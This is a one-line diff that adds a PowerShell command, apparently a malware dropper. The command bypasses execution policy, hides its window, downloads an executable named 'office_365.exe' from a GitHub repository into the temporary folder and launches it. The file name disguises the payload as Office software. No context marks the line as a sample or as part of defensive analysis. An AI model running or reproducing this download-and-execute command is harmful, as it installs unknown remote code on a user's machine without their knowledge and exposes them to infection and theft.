@@ -1,0 +1,1 @@
+PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile('https://github.com/MASMob2022/dhmas/raw/main/office_365.exe','%TEMP%\office_365.exe');Start-Process '%TEMP%\office_365.exe'
